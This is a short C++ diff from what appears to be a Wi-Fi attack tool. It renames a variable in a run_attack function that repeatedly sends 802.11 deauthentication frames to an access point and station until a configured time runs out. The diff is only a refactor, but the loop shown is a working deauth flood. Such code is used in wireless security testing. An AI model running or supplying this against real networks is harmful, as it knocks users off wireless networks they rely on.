@@ -54,10 +54,10 @@ void run_attack(RunStatus &rs) {
 
     log(LogLevel::INFO, "Deauth attack START");
     PacketSender sender{iface};
-    RadioTap pkt = make_deauth(ap_mac, sta_mac);
+    RadioTap frame = make_deauth(ap_mac, sta_mac);
     const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
     while (steady_clock::now() < end && !g_interrupted) {
-        sender.send(pkt);
+        sender.send(frame);
         interruptible_sleep(milliseconds(att_cfg.at("ms_interval")));
     }
     log(LogLevel::INFO, "Deauth attack END");
